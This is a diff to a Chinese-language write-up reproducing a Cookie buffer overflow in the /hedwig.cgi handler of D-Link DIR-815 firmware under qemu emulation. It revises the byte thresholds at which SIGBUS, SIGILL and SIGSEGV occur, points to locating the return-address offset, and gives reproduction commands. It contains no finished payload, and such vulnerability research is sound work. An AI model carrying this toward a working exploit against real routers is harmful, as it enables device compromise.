@@ -7,17 +7,31 @@
 
 **`/hedwig.cgi` 的 Cookie 溢出在本固件中真实存在，已复现。**
 
-| Cookie 长度（`uid=` + N 字节） | 结果 |
-|---|---|
-| 32 – 1037 | 正常返回（`HTTP/1.1 200 OK` + XML） |
-| **1038** | **SIGSEGV**（rc=139） |
-| 1500 / 2048 | SIGSEGV，伴随 1035–1037 区间偶发 SIGBUS / SIGILL |
+定义 **N = `uid=` 之后攻击者可控的字节数**（Cookie 整串长度 = N + 4）。
 
-最小触发长度：**1038 字节**（即 `uid=` 后面 1034 个字节）。
-1037 正常、1038 崩溃，已双向验证。
+| N | Cookie 整串 | 结果 |
+|---|---|---|
+| 32 – 1035 | 36 – 1039 | 正常返回（`HTTP/1.1 200 OK` + XML，cgibin rc=255） |
+| **1036** | **1040** | **SIGBUS**（rc=135） |
+| **1037** | **1041** | **SIGILL**（rc=132） |
+| **1038 – 2048+** | **1042 – 2052+** | **SIGSEGV**（rc=139） |
 
-偶发的 SIGBUS / SIGILL 说明覆盖已经踩到返回地址或保存的寄存器，
-不同长度下被破坏的指令流不同——这是构造函数利用链的起点。
+逐字节扫描（n 为 A 的个数，cookie 长度 = n + 4）：
+
+```text
+n=1035  cookie=1039  rc=255  正常
+n=1036  cookie=1040  rc=135  SIGBUS   <- 首次异常
+n=1037  cookie=1041  rc=132  SIGILL
+n=1038  cookie=1042  rc=139  SIGSEGV  <- 首次 SIGSEGV,此后稳定
+```
+
+**三种信号依次出现，是返回地址被逐字节覆盖的典型表现**：写坏低字节 → 跳到
+非法地址（BUS/ILL），写满 → 彻底段错误。缓冲区边界在 N≈1036，
+可以直接在此基础上定位 `$ra` 的偏移。
+
+> ⚠️ 踩过的坑：第一版扫描只把 SIGSEGV 算作崩溃，于是 SIGBUS/SIGILL
+> 被误判成"正常"，阈值被报大了 6 字节。**统计崩溃必须看 `rc >= 128`
+> （任意致命信号），不能只认 139。**
 
 ## 2. 关键发现
 
@@ -63,15 +77,15 @@ tar -xf DIR815_revB_FW_V2.02b01.bin_extracted_*.tar -C ~/work/dir815
 cd D-Link/DIR-815
 ROOTFS=~/work/dir815/squashfs-root ./tools/run-local.sh
 
-# 3. 只看不崩的边界
-ROOTFS=~/work/dir815/squashfs-root LEN=1037 ./tools/run-local.sh
+# 3. 只看不崩的边界(N=1035,cookie 1039 字节)
+ROOTFS=~/work/dir815/squashfs-root LEN=1035 ./tools/run-local.sh
 ```
 
 预期输出：
 
 ```text
 [*] qemu: qemu-mipsel version 8.2.2 ...
-[*] entry=/hedwig.cgi  cookie=1038 字节
+[*] entry=/hedwig.cgi  uid=<1038 字节>  cookie=<1042 字节>
 qemu: uncaught target signal 11 (Segmentation fault) - core dumped
 [!] rc=139 SIGSEGV —— 溢出已触发
 ```
